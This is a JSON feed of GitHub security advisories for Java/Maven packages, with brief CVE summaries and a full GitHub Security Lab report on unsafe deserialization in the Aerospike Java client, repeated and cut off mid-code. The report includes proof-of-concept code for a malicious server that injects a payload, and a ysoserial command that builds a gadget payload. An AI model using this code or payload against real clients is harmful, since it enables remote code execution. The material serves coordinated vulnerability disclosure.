{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Java artifacts hosted at the Maven central repository",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/maven.json",
    "description": "Security Advisory for Java artifacts hosted at the Maven central repository on GitHub",
    "items": [
        {
            "content_html": "<p>Cross Site Request Forgery (CSRF) vulnerability in <code>xxl-job-admin/user/add</code> in xuxueli xxl-job version 2.2.0 allows remote attackers to execute arbitrary code and esclate privileges via crafted .html file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-24922\">https://nvd.nist.gov/vuln/detail/CVE-2020-24922</a></li>\n<li><a href=\"https://github.com/xuxueli/xxl-job/issues/1921\">https://github.com/xuxueli/xxl-job/issues/1921</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jp5r-4x9q-4vcf\">https://github.com/advisories/GHSA-jp5r-4x9q-4vcf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jp5r-4x9q-4vcf",
            "title": "[com.xuxueli:xxl-job] xuxueli xxl-job Cross-Site Request Forgery Vulnerability",
            "date_modified": "2023-08-11T21:11:21.000Z",
            "date_published": "2023-08-11T15:30:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jp5r-4x9q-4vcf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Liferay Portal 7.2.0 through 7.3.2, and Liferay DXP 7.2 before fix pack 9, allows access to Cross-origin resource sharing (CORS) protected resources if the user is only authenticated using the portal session authentication, which allows remote attackers to obtain sensitive information including the targeted userâ€™s email address and current CSRF token.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33330\">https://nvd.nist.gov/vuln/detail/CVE-2021-33330</a></li>\n<li><a href=\"https://issues.liferay.com/browse/LPE-17127\">https://issues.liferay.com/browse/LPE-17127</a></li>\n<li><a href=\"https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/120747720\">https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/120747720</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6xxc-4jc4-7jv3\">https://github.com/advisories/GHSA-6xxc-4jc4-7jv3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6xxc-4jc4-7jv3",
            "title": "[com.liferay.portal:release.portal.bom] Exposure of Resource to Wrong Sphere in Liferay Portal",
            "date_modified": "2023-08-09T13:17:27.000Z",
            "date_published": "2022-05-24T22:28:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6xxc-4jc4-7jv3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A logic error in the room key sharing functionality of Element Android before 1.2.2 and matrix-android-sdk2 (aka Matrix SDK for Android) before 1.2.2 leads to a situation where identity verification is inadequate and thus a key-requesting device can be impersonated.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-40824\">https://nvd.nist.gov/vuln/detail/CVE-2021-40824</a></li>\n<li><a href=\"https://github.com/matrix-org/matrix-android-sdk2/releases/tag/v1.2.2\">https://github.com/matrix-org/matrix-android-sdk2/releases/tag/v1.2.2</a></li>\n<li><a href=\"https://matrix.org/blog/2021/09/13/vulnerability-disclosure-key-sharing\">https://matrix.org/blog/2021/09/13/vulnerability-disclosure-key-sharing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jjmc-4p83-pp26\">https://github.com/advisories/GHSA-jjmc-4p83-pp26</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jjmc-4p83-pp26",
            "title": "[org.matrix.android:matrix-android-sdk2] Logic error in Matrix SDK for Android",
            "date_modified": "2023-08-09T13:17:08.000Z",
            "date_published": "2022-05-24T19:14:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jjmc-4p83-pp26"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Those using jackson-dataformats-text to parse TOML data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-3894\">https://nvd.nist.gov/vuln/detail/CVE-2023-3894</a></li>\n<li><a href=\"https://github.com/FasterXML/jackson-dataformats-text/pull/398\">https://github.com/FasterXML/jackson-dataformats-text/pull/398</a></li>\n<li><a href=\"https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=50083\">https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=50083</a></li>\n<li><a href=\"https://github.com/FasterXML/jackson-dataformats-text/blob/2.16/release-notes/VERSION-2.x\">https://github.com/FasterXML/jackson-dataformats-text/blob/2.16/release-notes/VERSION-2.x</a></li>\n<li><a href=\"https://github.com/FasterXML/jackson-dataformats-text/commit/5dd5f740aedcf37adad7ffece460e75e54abb0ed\">https://github.com/FasterXML/jackson-dataformats-text/commit/5dd5f740aedcf37adad7ffece460e75e54abb0ed</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rg2c-cfxv-qp6f\">https://github.com/advisories/GHSA-rg2c-cfxv-qp6f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rg2c-cfxv-qp6f",
            "title": "[com.fasterxml.jackson.dataformat:jackson-dataformats-text] Denial of service in jackson-dataformats-text",
            "date_modified": "2023-08-09T12:52:22.000Z",
            "date_published": "2023-08-08T18:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rg2c-cfxv-qp6f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>StreamCorruptedException and NullPointerException in OpenDaylight odl-mdsal-xsql. Controller launches exceptions in the console. Component: OpenDaylight odl-mdsal-xsql is vulnerable to this flaw. Version: The tested versions are OpenDaylight 3.3 and 4.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-1000360\">https://nvd.nist.gov/vuln/detail/CVE-2017-1000360</a></li>\n<li><a href=\"https://aaltodoc.aalto.fi/bitstream/handle/123456789/21584/master_Bidaj_Andi_2016.pdf\">https://aaltodoc.aalto.fi/bitstream/handle/123456789/21584/master_Bidaj_Andi_2016.pdf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gjq3-997p-hg6f\">https://github.com/advisories/GHSA-gjq3-997p-hg6f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gjq3-997p-hg6f",
            "title": "[org.opendaylight.controller:releasepom] OpenDaylight NULL Pointer Dereference",
            "date_modified": "2023-08-09T05:02:44.000Z",
            "date_published": "2022-05-13T01:41:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gjq3-997p-hg6f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"github-security-lab-ghsl-vulnerability-report-ghsl-2023-044\">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>\n<p>The <a href=\"https://securitylab.github.com\">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href=\"https://github.com/aerospike/aerospike-client-java/\">Aerospike Java Client</a>.</p>\n<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>\n<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>\n<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>\n<h2 id=\"summary\">Summary</h2>\n<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>\n<h2 id=\"product\">Product</h2>\n<p>Aerospike Java Client</p>\n<h2 id=\"tested-version\">Tested Version</h2>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7\">6.1.7</a></p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"issue-unsafe-deserialization-of-server-responses-ghsl-2023-044\">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>\n<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157\"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>\n<pre><code class=\"language-java\">@Override\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    command.read((ByteBuf)msg);\n}\n</code></pre>\n<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code â€” for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489\"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>\n<pre><code class=\"language-java\">private void read(ByteBuf byteBuffer) {\n    eventReceived = true;\n\n    try {\n        switch (state) {\n            // --snip--\n            case AsyncCommand.COMMAND_READ_HEADER:\n                if (command.isSingle) {\n                    readSingleHeader(byteBuffer);\n                }\n                // --snip--\n        }\n        // --snip--\n    }\n    // --snip---\n}\n</code></pre>\n<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596\"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>\n<pre><code class=\"language-java\">private void readSingleHeader(ByteBuf byteBuffer) {\n    int readableBytes = byteBuffer.readableBytes();\n    int dataSize = command.dataOffset + readableBytes;\n\n    // --snip--\n\n    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);\n    command.dataOffset = dataSize;\n\n    if (command.dataOffset &gt;= receiveSize) {\n        parseSingleBody();\n    }\n}\n</code></pre>\n<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68\"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>\n<pre><code class=\"language-java\">@Override\nprotected final boolean parseResult() {\n    validateHeaderSize();\n\n    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;\n    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);\n    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);\n    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);\n    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);\n    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;\n\n    if (resultCode == 0) {\n        // --snip--\n        skipKey(fieldCount);\n        record = parseRecord(opCount, generation, expiration, isOperation);\n        return true;\n    }\n</code></pre>\n<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083\"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>\n<pre><code class=\"language-java\">protected final Record parseRecord(\n    int opCount,\n    int generation,\n    int expiration,\n    boolean isOperation\n)  {\n    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();\n\n    for (int i = 0 ; i &lt; opCount; i++) {\n        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);\n        byte particleType = dataBuffer[dataOffset + 5];\n        byte nameSize = dataBuffer[dataOffset + 7];\n        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);\n        dataOffset += 4 + 4 + nameSize;\n\n        int particleBytesSize = opSize - (4 + nameSize);\n        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);\n</code></pre>\n<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53\"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>\n<pre><code class=\"language-java\">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)\n    throws AerospikeException {\n        switch (type) {\n            // --snip--\n            case ParticleType.JBLOB:\n                return Buffer.bytesToObject(buf, offset, len);\n</code></pre>\n<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300\"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>\n<pre><code class=\"language-java\">public static Object bytesToObject(byte[] buf, int offset, int length) {\n    // --snip--\n    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {\n        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n            return oistream.readObject();\n        }\n    }\n    // --snip--\n}\n</code></pre>\n<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227\"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>\n<pre><code class=\"language-java\">private T unpackBlob(int count) throws IOException, ClassNotFoundException {\n    // --snip--\n    case ParticleType.JBLOB:\n        // --snip--\n        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {\n            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n                val = getJavaBlob(oistream.readObject());\n            }\n        }\n</code></pre>\n<p>This vulnerability was discovered with the help of <a href=\"https://codeql.github.com/\">CodeQL</a>.</p>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>\n<h4 id=\"remediation\">Remediation</h4>\n<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>\n<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>\n<h4 id=\"resources\">Resources</h4>\n<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>\n<pre><code class=\"language-java\">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {\n        // --snip--\n        if (s.getBytes()[7] == 0x44) {\n            AttackMessage m = new AttackMessage(\n                    Files.readAllBytes(Paths.get(\"location/of/deserialization/payload.bin\")));\n            ctx.channel().writeAndFlush(m);\n            return;\n        }\n        // --snip--\n    }\n}\n</code></pre>\n<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>\n<pre><code class=\"language-java\">public class AttackMessage {\n\n    private byte resultCode = 0;\n    private int generation = 2;\n    private int expiration = 417523457;\n    private short fieldCount = 0;\n    private short opCount = 1;\n    private byte particleType = 7;\n    private String name = \"putgetbin\";\n    private byte[] payload;\n\n    public AttackMessage(byte[] payload) {\n        this.payload = payload;\n    }\n\n    // --snip-- (getters)\n\n    public int[] getSize() {\n        int size = 30 + name.length() + payload.length;\n        int low = (byte) (size &amp; 0xFF);\n        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;\n        return new int[] {high, low};\n    }\n\n    public int getOpSize() {\n        return payload.length + 4 + name.length();\n    }\n\n    public byte[] getPayload() {\n        return payload;\n    }\n}\n</code></pre>\n<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>\n<pre><code class=\"language-java\">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {\n\n    @Override\n    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)\n            throws Exception {\n        // header\n        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});\n        int[] length = msg.getSize();\n        out.writeByte(length[0]);\n        out.writeByte(length[1]);\n\n        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});\n        out.writeByte(msg.getResultCode());\n        out.writeInt(msg.getGeneration());\n        out.writeInt(msg.getExpiration());\n\n        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});\n        out.writeShort(msg.getFieldCount());\n        out.writeShort(msg.getOpCount());\n        out.writeInt(msg.getOpSize());\n\n        out.writeByte(0x01);\n        out.writeByte(msg.getParticleType());\n\n        out.writeByte(0x00);\n        out.writeByte(msg.getName().length());\n        out.writeCharSequence(msg.getName(), Charset.defaultCharset());\n        out.writeBytes(msg.getPayload());\n    }\n\n}\n</code></pre>\n<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>\n<pre><code class=\"language-xml\">&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;\n  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;\n  &lt;version&gt;4.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>In which case, the malicious payload file could be generated using <a href=\"https://github.com/frohoff/ysoserial\"><code>ysoserial</code></a> as follows:</p>\n<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin\n</code></pre>\n<h2 id=\"github-security-advisories\">GitHub Security Advisories</h2>\n<p>We recommend you create a private <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory\">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory\">published</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was discovered and reported by the GitHub CodeQL team members <a href=\"https://github.com/atorralba\">@atorralba (Tony Torralba)</a> and <a href=\"https://github.com/joefarebrother\">@joefarebrother (Joseph Farebrother)</a>.</p>\n<h2 id=\"contact\">Contact</h2>\n<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>\n<h2 id=\"disclosure-policy\">Disclosure Policy</h2>\n<p>This report is subject to our <a href=\"https://securitylab.github.com/advisories#policy\">coordinated disclosure policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597\">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900\">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36480\">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>\n<li><a href=\"https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses\">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a\">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae\">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36\">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj95-55cr-9597\">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj95-55cr-9597",
            "title": "[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses",
            "date_modified": "2023-08-08T14:55:46.000Z",
            "date_published": "2023-08-03T19:45:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj95-55cr-9597"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"github-security-lab-ghsl-vulnerability-report-ghsl-2023-044\">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>\n<p>The <a href=\"https://securitylab.github.com\">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href=\"https://github.com/aerospike/aerospike-client-java/\">Aerospike Java Client</a>.</p>\n<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>\n<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>\n<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>\n<h2 id=\"summary\">Summary</h2>\n<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>\n<h2 id=\"product\">Product</h2>\n<p>Aerospike Java Client</p>\n<h2 id=\"tested-version\">Tested Version</h2>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7\">6.1.7</a></p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"issue-unsafe-deserialization-of-server-responses-ghsl-2023-044\">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>\n<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157\"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>\n<pre><code class=\"language-java\">@Override\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    command.read((ByteBuf)msg);\n}\n</code></pre>\n<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code â€” for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489\"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>\n<pre><code class=\"language-java\">private void read(ByteBuf byteBuffer) {\n    eventReceived = true;\n\n    try {\n        switch (state) {\n            // --snip--\n            case AsyncCommand.COMMAND_READ_HEADER:\n                if (command.isSingle) {\n                    readSingleHeader(byteBuffer);\n                }\n                // --snip--\n        }\n        // --snip--\n    }\n    // --snip---\n}\n</code></pre>\n<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596\"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>\n<pre><code class=\"language-java\">private void readSingleHeader(ByteBuf byteBuffer) {\n    int readableBytes = byteBuffer.readableBytes();\n    int dataSize = command.dataOffset + readableBytes;\n\n    // --snip--\n\n    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);\n    command.dataOffset = dataSize;\n\n    if (command.dataOffset &gt;= receiveSize) {\n        parseSingleBody();\n    }\n}\n</code></pre>\n<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68\"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>\n<pre><code class=\"language-java\">@Override\nprotected final boolean parseResult() {\n    validateHeaderSize();\n\n    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;\n    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);\n    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);\n    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);\n    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 